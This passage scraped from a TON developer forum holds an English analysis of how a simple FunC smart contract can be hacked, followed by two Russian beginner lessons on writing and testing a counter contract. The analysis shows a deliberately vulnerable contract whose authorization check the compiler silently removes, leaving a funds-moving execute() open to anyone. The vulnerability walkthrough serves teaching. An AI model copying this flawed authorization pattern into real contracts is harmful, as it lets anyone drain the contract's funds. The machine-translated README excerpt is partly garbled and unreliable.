  addr1 = ds~load_msg_addr();
  addr2 = ds~load_msg_addr();
}
```

#### [](#body-of-the-smart-contract-19)“Body” of the smart contract

In order for a smart contract to implement any logic, it must have methods that can be accessed.

##### [](#reserved-methods-20)Reserved Methods

Smart contracts on the TON network have two reserved methods that can be accessed.

First, `recv_external()` this function is executed when a request to the contract comes from the outside world, that is, not from TON, for example, when we ourselves form a message and send it through lite-client (About installing lite-client). Second, `recv_internal()` this function is executed when inside TON itself, for example, when any contract refers to ours.

A lite-client is software that connects to full nodes to interact with the blockchain. They help users access and interact with the blockchain without the need to synchronize the entire blockchain.

This smart contract uses `recv_internal()`:

```
() recv_internal (in_msg_full, in_msg_body) {

}
```

Here the question should arise, what kind of `in_msg_full`, `in_msg_body`.  
According to the documentation of the [TON virtual machine - TVM](https://ton-blockchain.github.io/docs/tvm.pdf), when an event occurs on an account in one of the TON chains, it triggers a transaction.

Each transaction consists of up to 5 stages. More details [here](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=transactions-and-phases).

We are interested in **Compute phase**. And to be more specific, what is “on the stack” during initialization. For normal post-triggered transactions, the initial state of the stack looks like this:

5 elements:

*   Smart contract balance (in nanoTons)
*   Incoming message balance (in nanotones)
*   Cell with incoming message
*   Incoming message body, slice type
*   Function selector (for recv\_internal it is 0)

In the logic of this smart contract, we do not need a balance, etc., therefore, `in_msg_full`, `in_msg_body`, the cell with the incoming message and the body of the incoming message are written as arguments.

##### [](#filling-the-method-checking-for-empty-messages-21)Filling the method - checking for empty messages

The first thing we do inside `recv_internal()` is to drop the processing of empty messages. Let’s check using `slice_empty()` (function of the standard library, [link to the description in the documentation](https://ton-blockchain.github.io/docs/#/func/stdlib?id=slice_empty)) and finish the smart -contract in case of an empty message with `return()`.

```
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
}
```

The next step is to take the address from the full message, but the message needs to be parsed before we “get to the address”.

In order for us to take the address, we need to convert the cell into a slice using `begin_parse`:

```
slice cs = in_msg_full.begin_parse();
```

##### [](#h-22)Вычитываем сообщение - пропускаем флаги

Now we need to “subtract” the resulting slice to the address. Using the `load_uint` function from the [FunC standard library](https://ton-blockchain.github.io/docs/#/func/stdlib) it loads an unsigned n-bit integer from the slice, “subtract” the flags.

```
int flags = cs~load_uint(4);
```

In this lesson, we will not dwell on the flags in detail, but you can read more in paragraph [3.1.7](https://ton-blockchain.github.io/docs/tblkch.pdf).

After receiving the flags, we will ignore the bounced messages that are not of interest to us:

```
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
}
```

##### [](#get-the-senders-address-23)Get the sender’s address

Finally, we can take the sender address from the message, take it with the help of the already familiar `load_msg_addr()` and immediately use the helper function that we wrote earlier to load addresses from the `c4` register:

```
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();

}
```

##### [](#authorization-24)“Authorization”

Now, before moving on to the logic of the smart contract, it would be good to check that the sender address is either the first or the second address from the storage, i.e. we will make sure that further logic is executed only by the owners of the smart contract. To do this, we will make an auxiliary function `authorize()`:

```
() authorize (sender) inline {

}
```

The `inline` specifier puts the body of the function directly into the code of the parent function.

If a message is received that is not from our two addresses, we will throw an exception and finish the execution of the smart contract. For this, we will use [built-ins](https://ton-blockchain.github.io/docs/#/func/builtins) exceptions.

##### [](#exceptions-25)Exceptions

Exceptions can be thrown by the conditional primitives `throw_if` and `throw_unless` and the unconditional `throw`.

Let’s use `throw_if` and pass any error code.

```
() authorize (sender) inline {
  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
}
```

> `equal_slice_bit` - standard library function, checks for equality

##### [](#the-same-mistake-that-allows-you-to-hack-the-contract-26)The same mistake that allows you to hack the contract

B seems to be everything, but this is where the error lies, which allows you to hack the smart contract - this function will be removed during compilation, since it lacks the `impure` specifier

According to the documentation:

The `impure` specifier means that the function may have some side effects that should not be ignored. For example, we must specify the `impure` specifier if the function can modify the contract store, send messages, or throw an exception when some data is invalid and the function is intended to validate that data.

If `impure` is not specified and the result of a function call is not used, then the FunC compiler can and will remove that function call.

That is why this contract is vulnerable - authorization will simply disappear during compilation.

##### [](#contract-logic-27)Contract logic

Despite the vulnerability found, let’s analyze the contract to the end: we will get the cell with the request from the message body:

```
cell request = in_msg_body~load_ref();
```

> load\_ref() - loads the first link from the slice.

The last piece remains, the `execute()` function:

```
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);

	cell request = in_msg_body~load_ref();
	execute(request);
}
```

##### [](#fill-register-c5-28)Fill register c5

FunC supports function definition in assembler (meaning Fift). This happens as follows - we define a function as a low-level TVM primitive. In our case:

```
() execute (cell) impure asm "c5 POPCTR";
```

As you can see, the `asm` keyword is used

POPCTR c(i) - pops the value of x from the stack and stores it in the control register c(i),

You can see the list of possible primitives from page 77 in [TVM](https://ton-blockchain.github.io/docs/tvm.pdf).

##### [](#register-c5-29)Register c5

Register `c5` contains output actions. Accordingly, we can put a message here that will display the funds.

## [](#conclusion-30)Conclusion

I write similar tutorials and analyzes on the TON network in my channel - [Telegram: Contact @ton\_learn](https://t.me/ton_learn) . I will be glad to your subscription.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/bonus/18lesson/hack_eng.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/bonus/18lesson/hack\_eng.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/bonus/18lesson/hack_eng.md)

```
# How to hack simple smart contract in the TON blockchain

![hack smart contract for TON](./img/1.jpg)

## Introduction

In this article, we will analyze the hacking of a simple smart contract in the TON network. Don’t worry if you don’t know what TON is or how to write smart contracts, this article will be both a short analysis for the “pros of smart contract development” and a detailed analysis for beginners.

### What is TON?

TON is a decentralized support developed in this area, developed by the Telegram team, in 2019 the Telegram team received a ban from the American Securities Commission to issue their cryptocurrency, which made the continuation of work on protection incredible, but TON was "transferred" to an independent community of participants The Open Network, which is currently observed. It boasts super-fast transactions, ranking wins, collection app boosts, and eco-logicality.

![TON](./img/2.jpg)

The TON technical network is a network of virtual machines [TVM] (https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview). TVM also allows you to execute some code. Application developers load programs into the TVM framework. Expected programs on the network are dropped by smart contracts.

In the present, we will analyze a simple smart contract that allows you to provide users with mutual funding to manage their funds.

### Acting model

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/bonus/18lesson/hack_eng.md)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 455

[TON Research](/)

# [Пишем смарт-контракты на FunC - Урок 1 Простой смарт-контракт](/t/func-1/455)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[func](https://tonresear.ch/tag/func), [learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:32pm  1

# [](#h-1-1)Урок 1 Простой смарт-контракт

## [](#h-2)Введение

В этом уроке мы напишем ваш первый смарт-контракт в блокчейне TON на языке FunC, задеплоим\* его в тестовую сеть с помощью [Blueprint](https://github.com/ton-community/blueprint), а затем попробуем взаимодействовать с ним через JavaScript-библиотеку [ton](https://github.com/ton-core/ton).

> \*Деплой - процесс переноса в сеть (в данном случае смарт-контракта в блокчейн)

## [](#h-3)Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например, 18.

## [](#h-4)Смарт-контракт

Смарт-контракт, который мы будем делать, должен обладать следующей функциональностью:

*   Хранить в своих данных целое число _total_ - 64-битное число без знака
*   При получении внутреннего входящего сообщения контракт должен взять 32-битное целое число без знака из тела сообщения, добавить его к _total_ и сохранить в своих данных
*   В смарт-контракте должен быть предусмотрен метод _get\_total_ позволяющий вернуть значение _total_
*   Если тело входящего сообщения меньше 32 бит, то контракт должен выдать исключение

## [](#blueprint-5)Создадим проект с помощью Blueprint

В консоли выполним следующую команду:

```
npm create ton@latest
```

Далее просто следуем инструкциям. Нужно будет ввести название проекта, название смарт-контракта и по желанию выбрать заготовку для простого контракта. Для нашего урока назовём проект `my-counter`, а смарт-контракт `Сounter`, и выберем старт с пустого контракта на языке **FunC**, о котором мы поговорим чуть позже.

```
? Project name my-counter
? First created contract name (PascalCase) Counter
? Choose the project template An empty contract (FunC)
```

Blueprint создал простой проект. Перейдём в его директорию:

```
cd my-counter
```

Там вы можете увидеть 4 папки:

*   contracts
*   wrappers
*   scripts
*   tests

На данном этапе нас интересуют папки _contracts_ и _wrappers_, в которых мы будем писать код на FunС и обёртку для него на TypeScript соответственно.

##### [](#func-6)Что такое FunC?

Для программирования смарт-контрактов в блокчейне TON рекомендуется использовать язык FunC. Подробнее с ним можно ознакомиться [в документации](https://docs.ton.org/develop/func/overview)

##### [](#h-7)Подготовим файл для нашего кода

Зайдём в папку contracts:

```
cd contracts
```

И откроем файл `counter.fc`. На своем экране вы увидите смарт-контракт с всего одной пустой функцией. Теперь мы готовы начать писать наш первый смарт-контракт.

## [](#h-8)Функции смарт-контракта

У смарт-контрактов в сети TON есть две основных функции:

*   Первая — `recv_external()`, эта функция выполняется, когда запрос к контракту происходит из внешнего мира, то есть не из TON. Например, когда вы из приложения обращаетесь к смарт-контракту кошелька, чтобы перевести другу Toncoin, это обращение происходит как раз через `recv_external()`.
*   Вторая — `recv_internal()`, эта функция выполняется, когда обращение к контракту происходит непосредственно внутри блокчейна. Например, когда какой-либо контракт обращается к нашему.

Под наши условия подходит `recv_internal()`

В файле `counter.fc` уже есть объявленная функция без кода:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    ;; здесь будет код
}
```

> ;; две точки с запятой — синтаксис однострочного комментария

Функция принимает числа с балансом контракта, суммой входящего сообщения, ячейкой с исходным сообщением и слайс in\_msg\_body, в котором хранится только тело принимаемого сообщения. Также мы используем ключевое слово impure.

`impure` — ключевое слово, которое указывает компилятору на то, что нельзя вырезать её выполнение при оптимизациях.

Например, мы должны указать спецификатор `impure`, если функция может изменять хранилище контрактов, отправлять сообщения или генерировать исключения.

Важно: Если не указано impure и результат вызова функции не используется, то компилятор FunC может свободно удалить этот вызов функции.

А вот чтобы понять, что такое слайс и ячейка, поговорим про типы данных в TON.

##### [](#cell-slice-builder-integer-func-9)Типы cell, slice, builder, integer в FunC

В нашем простом смарт-контракте мы будем использовать всего лишь четыре типа:

*   Cell - ячейка TVM, состоящая из 1023 бит данных и до 4 ссылок на другие ячейки. Наличие ссылок формирует так называемое “дерево ячеек”.
*   Slice - частичное представление ячейки TVM, используемой для прочтения данных из ячейки.
*   Builder - частично построенная ячейка, содержащая до 1023 бит данных и до четырех ссылок. В такой тип ячейки мы можем только записывать новые данные, чтобы потом перевести её в обычный Cell.
*   Integer - знаковое 257-битное целое число.

Подробнее о типах в FunC можно почитать [в документации](https://docs.ton.org/develop/func/types).

Говоря простым языком, cell - это запечатанная ячейка, slice - это ячейка, из которой можно читать данные, а builder - это ячейка, в которую можно писать данные.

## [](#integer-10)Читаем Integer из тела сообщения

Чтобы прочитать из полученного слайса с телом сообщения Integer, добавим следуюший код:  
`int n = in_msg_body~load_uint(32);`

Функция `recv_internal()` теперь выглядит так:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    int n = in_msg_body~load_uint(32);
}
```

`load_uint` — функция из [стандартной библиотеки FunC](https://docs.ton.org/develop/func/stdlib/), она читает и возвращает целое беззнаковое число с заданным размером из слайса.

## [](#h-11)Данные смарт-контракта

Чтобы добавить полученную переменную к `total` и сохранить значение в смарт-контракте, рассмотрим, как реализована функциональность хранения постоянных данных/хранилища в TON.

> Примечание: не путайте с TON Storage, хранилище в предыдущем предложении — удобная аналогия.

Виртуальная машина TVM является стековой, но помимо стека, в ней присутствуют специальные “регистры”, которые хранят, например, код смарт-контракта, глобальный конфиг блокчейна, а также данные смарт-контракта.

Для хранения постоянных данных отведен регистр `с4` с типом Cell.

Подробнее с регистрами можно ознакомиться [в документации](https://docs.ton.org/learn/tvm-instructions/tvm-overview#control-registers).

##### [](#h-4-12)Возьмем данные из с4

Для того, чтобы “достать” данные из с4, нам понадобятся две функции из [стандартной библиотеки FunC](https://docs.ton.org/develop/func/stdlib/).

А именно:  
`get_data` - берет ячейку из регистра c4.  
`begin_parse` - ячейку преобразует в slice.

Создадим переменную `ds`, в которую и положим полученный слайс.

`slice ds = get_data().begin_parse();`

А также прочитаем из этого слайса в числовую переменную `total` число размером 64 бит для суммирования в соответствии с нашей задачей (с помощью уже знакомой нам функции `load_uint`).

`int total = ds~load_uint(64);`

Теперь наша функция будет выглядеть так:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    int n = in_msg_body~load_uint(32);

    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);
}
```

##### [](#c-13)Cуммируем

Для суммирования будем использовать операцию суммирования `+`, а также присвоение `=`.

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    int n = in_msg_body~load_uint(32);

    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    total += n;
}
```

> Как и во многих других языках программирования, в FunC можно объединить операции `+` и `=` в `+=`. То же самое и для `-=`, `/=`, `*=`.

##### [](#c-14)Cохраняем значение

Для того, чтобы сохранить значение `total` в постоянные данные контракта, нам необходимо выполнить четыре действия:

*   Создать Builder для будущей ячейки данных
*   Записать в этот билдер значение
*   Преобразовать билдер в ячейку
*   Записать полученную ячейку в регистр c4

Делать это мы будем опять же с помощью функций [стандартной библиотеки FunC](https://docs.ton.org/develop/func/stdlib/).

`set_data(begin_cell().store_uint(total, 64).end_cell());`

`begin_cell()` - создаст Builder для будущей ячейки  
`store_uint()`\- запишет значение total  
`end_cell()`\- создать Cell из билдера  
`set_data()` - запишет ячейку в регистр с4

Итог:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    int n = in_msg_body~load_uint(32);

    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    total += n;

    set_data(begin_cell().store_uint(total, 64).end_cell());
}
```

## [](#h-15)Генерация исключений

Все, что осталось сделать в нашей функции `recv_internal()` — это добавить вызов исключения, если в теле полученного сообщения недостаточно бит для 32-битного числа.

Для этого будем использовать [встроенные](https://docs.ton.org/develop/func/builtins) исключения.

Исключения могут быть вызваны условными примитивами `throw_if` и `throw_unless`, а также безусловным `throw`.

Воспользуемся `throw_if` и передадим любой код ошибки. Для того, чтобы взять битность, используем `slice_bits()`.

```
throw_if(35,in_msg_body.slice_bits() < 32);
```

Кстати, в TVM (виртуальная машина TON) есть стандартные коды исключений, они нам очень понадобятся в тестах. Посмотреть можно [здесь](https://docs.ton.org/learn/tvm-instructions/tvm-exit-codes).

Вставим в начало функции:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    throw_if(35,in_msg_body.slice_bits() < 32);

    int n = in_msg_body~load_uint(32);

    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    total += n;

    set_data(begin_cell().store_uint(total, 64).end_cell());
}
```

## [](#get-16)Пишем Get-функцию

Любая функция в FunC соответствует следующему паттерну:

`[<forall declarator>] <return_type><function_name(<comma_separated_function_args>) <specifiers>`

Напишем функцию `get_total()`, возвращающую Integer и имеющую спецификатор method\_id (об этом чуть позже).

```
int get_total() method_id {
    ;; здесь будет код
}
```

##### [](#method_id-17)method\_id

Спецификация `method_id` позволяет вызывать функцию по её названию. Для гет-методов это обязательно.

##### [](#h-4-18)Берем данные из с4

Для того, чтобы функция возвращала `total`, хранящееся в контракте, нам надо взять данные из регистра, что мы уже делали:

```
int get_total() method_id {
    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    return total;
}
```

## [](#h-19)Весь код нашего смарт-контракта

```
#include "imports/stdlib.fc";

() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    throw_if(35,in_msg_body.slice_bits() < 32);

    int n = in_msg_body~load_uint(32);

    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    total += n;

    set_data(begin_cell().store_uint(total, 64).end_cell());
}

int get_total() method_id {
    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    return total;
}
```

## [](#typescript-20)Пишем обёртку для контракта на TypeScript

Мы хотим иметь возможность взаимодействовать с нашим смарт-контрактом. Для этого напишем так называемую обёртку на языке TypeScript (типизированный JavaScript).

Перейдите в директорию wrappers проекта и откройте файл Counter.ts. Большая часть обёртки уже присутствует по умолчанию. Сейчас нам нужно лишь дополнить ту часть, где задаются данные контракта для деплоя, и добавить две функции для взаимодействия: отправка чисел контракту и вызов гет-метода get\_total().

### [](#h-21)Устанавливаем данные для деплоя

Эти строчки отвечают за то, что мы хотим устанавливать в данные контракта (ячейка c4):

```
export type CounterConfig = {};

export function counterConfigToCell(config: CounterConfig): Cell {
    return beginCell().endCell();
}
```

`CounterConfig` — это объект, в который при необходимости мы можем добавить значения, которыми будет инициализироваться контракт.  
`counterConfigToCell` — это функция, которая преобразовывает тот самый объект в ячейку, которая готова к записи в данные контракта для деплоя.

В нашем случае в данных контракта должно лежать всего одно число длины 64 бита. CounterConfig нам не понадобится, а вот функцию обновить нужно.

Функция возвращает только одну ячейку, в которую мы записываем данные для деплоя контракта. Добавим туда запись числа 0 длиной 64 бита:

```
return beginCell().storeUint(0, 64).endCell();
```

Теперь при создании контракта в его данных сразу будет лежать число 0.

### [](#h-22)Метод для отправки сообщений с числами

Ниже в том же файле инициализируется класс Counter, в котором мы можем изменять старые и добавлять новые методы для взаимодействия с контрактом. По умолчанию там уже есть методы для инициализации контракта либо из конфига, либо из адреса уже задеплоенного контракта, а также готовый метод для деплоя.

Давайте добавим метод, с помощью которого мы сможем отправить контракту сообщение для увеличения числа total.

> Все методы обёртки, которые отправляют сообщения, должны иметь префикс `send` в начале.  
> Все методы обёртки, которые вызывают гет-методы, должны иметь префикс `get` в начале.

Для удобства можем скопировать метод sendDeploy, переименовать его в sendNumber и потом уже изменить только то, что будет нужно.

```
async sendNumber(provider: ContractProvider, via: Sender, value: bigint) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell().endCell(),
    });
}
```

Этот метод принимает объекты provider и via, которые определяют, куда и от кого нужно отправить сообщение соответственно. Также передаётся число value, которое означает, сколько Toncoin мы хотим прикрепить к отправляемому сообщению.

В теле метода вызывается функция provider.internal(), которая отправляет сообщение на наш контракт. Она принимает объект via, который мы получили ранее, а также параметры отправляемого сообщения. Эти параметры нам и нужно сейчас изменить.

Как мы помним, наш смарт-контракт ожидает от получаемого сообщения лишь одно число длиной 32 бита. Давайте добавим аргумент для нашего метода и изменим параметр body:

```
async sendNumber(provider: ContractProvider, via: Sender, value: bigint, number: bigint) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell().storeUint(number, 32).endCell(),
    });
}
```

Лучше всегда использовать тип bigint для чисел в обёртках смарт-контрактов, так как он поддерживает очень большие числа и является более точным, чем number.

### [](#get_total-23)Метод для вызова get\_total

Добавим метод, который будет вызывать get\_total у нашего контракта:

```
async getTotal(provider: ContractProvider) {
    // тут будет код
}
```

Он уже не должен принимать параметры via и value, так как при вызове гет-методов никаких сообщений контракту не посылается.

Добавим вызов get\_total. Для этого используем функцию `provider.get`, которая принимает два параметра: название гет-метода и аргументы, которые в него следует передать. В нашем случае название это “get\_total”, а список аргументов пустой.

```
const result = (await provider.get('get_total', [])).stack;
```

Теперь вернём из нашей функции `getTotal` полученное в результате число:

```
return result.readBigNumber();
```

### [](#h-24)Весь код обёртки

```
import {
    Address,
    beginCell,
    Cell,
    Contract,
    contractAddress,
    ContractProvider,
    Sender,
    SendMode,
} from 'ton-core';

export type CounterConfig = {};

export function counterConfigToCell(config: CounterConfig): Cell {
    return beginCell().storeUint(0, 64).endCell();
}

export class Counter implements Contract {
    constructor(
        readonly address: Address,
        readonly init?: { code: Cell; data: Cell }
    ) {}

    static createFromAddress(address: Address) {
        return new Counter(address);
    }

    static createFromConfig(config: CounterConfig, code: Cell, workchain = 0) {
        const data = counterConfigToCell(config);
        const init = { code, data };
        return new Counter(contractAddress(workchain, init), init);
    }

    async sendDeploy(provider: ContractProvider, via: Sender, value: bigint) {
        await provider.internal(via, {
            value,
            sendMode: SendMode.PAY_GAS_SEPARATELY,
            body: beginCell().endCell(),
        });
    }

    async sendNumber(
        provider: ContractProvider,
        via: Sender,
        value: bigint,
        number: bigint
    ) {
        await provider.internal(via, {
            value,
            sendMode: SendMode.PAY_GAS_SEPARATELY,
            body: beginCell().storeUint(number, 32).endCell(),
        });
    }

    async getTotal(provider: ContractProvider) {
        const result = (await provider.get('get_total', [])).stack;
        return result.readBigNumber();
    }
}
```

## [](#h-25)Деплоим контракт в тестовую сеть

Для деплоя в тестовую сеть будем использовать интерфейс для командной строки [Blueprint](https://github.com/ton-community/blueprint/), который был установлен автоматически при создании проекта.

`npx blueprint run`

Далее следуем инструкциям. Выбираем тестовую сеть - testnet. Затем требуется способ авторизации кошелька, с которого будет производиться деплой. Можно подключить Tonkeeper или Tonhub, если выбрать первый пункт TON Connect.  
В консоли появится QR-код, который нужно отсканировать из приложения вашего кошелька на телефоне. Если такой способ не устраивает, можете воспользоваться одним из других предложенных способов.

После успешного подключения кошелька, вероятно, потребуется подтвердить отправку транзакции из приложения. Если вы всё сделали правильно, в консоли увидите сообщение о том, что контракт успешно задеплоен.

##### [](#toncoin-26)Что делать, если пишет, что не хватает Toncoin?

Необходимо получить их из тестового крана, бот для этого — [@testgiver\_ton\_bot](https://t.me/testgiver_ton_bot).

Чтобы проверить, пришли ли тонкоины на ваш кошелек в тестовой сети, можете использовать вот этот explorer: [https://testnet.tonscan.org/](https://testnet.tonscan.org/)

> Важно: Речь идет только о тестовой сети

## [](#h-27)Проверяем контракт

##### [](#recv_internal-28)Вызов recv\_internal()

Для вызова recv\_internal() необходимо послать сообщение внутри сети TON. Для этого мы создали метод `sendNumber` в обёртке.  
Чтобы воспользоваться этим методом и отправить сообщение с кошелька, напишем небольшой скрипт на TypeScript, который будет отправлять сообщение в наш контракт, используя обёртку.

##### [](#h-29)Скрипт сообщения

Создадим в папке scripts файл `sendNumber.ts` и напишем в нем следующий код (большую часть которого можно скопировать из файла deployCounter.ts той же папки):

```
import { toNano } from 'ton-core';
import { Counter } from '../wrappers/Counter';
import { compile, NetworkProvider } from '@ton-community/blueprint';

export async function run(provider: NetworkProvider) {
    const counter = provider.open(
        Counter.createFromConfig({}, await compile('Counter'))
    );

    // тут будет код
}
```

Этот код объявляет единственную функцию `run`, в которой мы можем взаимодействовать с нашим смарт-контрактом. Для этого создаётся объект `counter` класса-обёртки, который мы писали выше в этом уроке.  
Теперь добавим в функцию вызов метода `sendNumber`:

```
await counter.sendNumber(provider.sender(), toNano('0.01'), 123n);
```

Чтобы запустить скрипт, снова исполните команду `npx blueprint run` в консоли, но в этот раз выберите нужный скрипт - то есть `sendNumber`. Скорее всего, кошелёк уже будет подключен с момента деплоя, поэтому снова авторизацию проходить не понадобится.

Если вы видите в консоли надпись “**Sent transaction**”, то наше сообщение контракту отправилось. Теперь давайте проверим, обновилось ли число в данных контракта, с помощью метода `getTotal`.

#### [](#h-30)Скрипт гет-метода

Создадим ещё один файл в директории scripts, например `getTotal.ts` и снова скопируем тот же код в него, но в этот раз воспользуемся нашим методом getTotal() из обёртки.

```
import { toNano } from 'ton-core';
import { Counter } from '../wrappers/Counter';
import { compile, NetworkProvider } from '@ton-community/blueprint';

export async function run(provider: NetworkProvider) {
    const counter = provider.open(
        Counter.createFromConfig({}, await compile('Counter'))
    );

    console.log('Total:', await counter.getTotal());
}
```

Аналогично запустим скрипт с помощью команды `npx blueprint run`, и после выполнения вы должны увидеть в консоли надпись “**Total: 123n**”.

## [](#h-31)Поздравляю, вы дошли до конца

##### [](#h-32)Задание

Как вы могли заметить, мы не протестировали работу исключений. Модифицируйте сообщение в обёртке таким образом, чтобы смарт-контракт это сделал.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/1lesson/firstlesson.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/smartcontract/1lesson/firstlesson.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/1lesson/firstlesson.md)

```
# Урок 1 Простой смарт-контракт

## Введение

В этом уроке мы напишем ваш первый смарт-контракт в блокчейне TON на языке FunC, задеплоим\* его в тестовую сеть с помощью [Blueprint](https://github.com/ton-community/blueprint), а затем попробуем взаимодействовать с ним через JavaScript-библиотеку [ton](https://github.com/ton-core/ton).

> \*Деплой - процесс переноса в сеть (в данном случае смарт-контракта в блокчейн)

## Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например, 18.

## Смарт-контракт

Смарт-контракт, который мы будем делать, должен обладать следующей функциональностью:

-   Хранить в своих данных целое число _total_ - 64-битное число без знака
-   При получении внутреннего входящего сообщения контракт должен взять 32-битное целое число без знака из тела сообщения, добавить его к _total_ и сохранить в своих данных
-   В смарт-контракте должен быть предусмотрен метод _get_total_ позволяющий вернуть значение _total_
-   Если тело входящего сообщения меньше 32 бит, то контракт должен выдать исключение
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/1lesson/firstlesson.md)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 456

[TON Research](/)

# [Пишем смарт-контракты на FunC - Урок 2 Тесты на FunC для первого смарт-контракта](/t/func-2-func/456)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[func](https://tonresear.ch/tag/func), [learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:32pm  1

# [](#h-2-func-1)Урок 2 Тесты на FunC для смарт-контракта

## [](#h-2)Введение

В этом уроке мы напишем тесты для смарт-контракта созданного в первом уроке в блокчейне TON и выполним их с помощью [Blueprint](https://github.com/ton-community/blueprint).

## [](#h-3)Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org) (желательно версии 18 или выше) и пройти [первый урок](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## [](#te-4)Teсты для первого смарт-контракта

Для нашего первого смарт-контракта мы напишем следующие тесты:

*   вызовем recv\_internal() с разными числами и проверим метод get\_total
*   проверим вызов ошибки при не соответствии числа условию битности

## [](#blueprint-5)Структура тестов в Blueprint

Для тестирования смарт-контрактов в Blueprint-проектах используется библиотека [Sandbox](https://github.com/ton-community/sandbox). Она установлена по-умолчанию во всех проектах, созданных через Blueprint.

Сами тесты находятся в папке `tests/`. Для каждого смарт-контракта проекта (их может быть несколько) создаётся отдельный файл. В нашем случае в этой папке должен лежать лишь один файл `Counter.spec.ts`. В нём уже написано всё что нужно для тестирования нашего смарт-контракта, и даже прописан первый тест, который проверяет, что контракт успешно деплоится. Остаётся только добавить новые тесты.

### [](#h-6)Важный момент

Если запустить тесты командой `npx blueprint test` в текущем положении, вы увидите ошибку в единственном тесте, называющемся “should deploy”. В большинстве случаев, этот тест должен сразу выполняться успешно. Но наш контракт по-просту вызывает ошибку, потому что в полученном при деплое сообщении не лежит 32-битное число (в первом уроке мы специально добавили вызов такой ошибки при отсуствии числа).

Чтобы исправить это и игнорировать ошибку при деплое - найдите фрагмент кода, в котором проверяется успешность деплоя. Из него нужно убрать проверку на `success`. Должно получиться так:

```
expect(deployResult.transactions).toHaveTransaction({
    from: deployer.address,
    to: counter.address,
    deploy: true,
});
```

Теперь, если выполнить команду `npx blueprint test` в терминале вы увидите следующее:

```
 PASS  tests/Counter.spec.ts
  Counter
    ✓ should deploy (123 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.085 s, estimated 2 s
Ran all test suites.
✨  Done in 2.47s.
```

Что означает успешное прохождение теста.

## [](#recv_internal-get_total-7)Тестируем вызов recv\_internal() и get\_total()

Напишем первый тест и разберем его код.

После стандартного теста `it('should deploy', ...)` напишем новый:

```
it('should update the number', async () => {
    // здесь будет код
});
```

Строка “should update the number” может быть любой. Это лишь пояснение для нас самих, в чём заключается суть теста.

Теперь напишем сам код теста:

```
it('should update the number', async () => {
    const caller = await blockchain.treasury('caller');

    await counter.sendNumber(caller.getSender(), toNano('0.01'), 10n);
    expect(await counter.getTotal()).toEqual(10n);

    await counter.sendNumber(caller.getSender(), toNano('0.01'), 5n);
    expect(await counter.getTotal()).toEqual(15n);

    await counter.sendNumber(caller.getSender(), toNano('0.01'), 1000n);
    expect(await counter.getTotal()).toEqual(1015n);
});
```

### [](#h-8)Разбираем

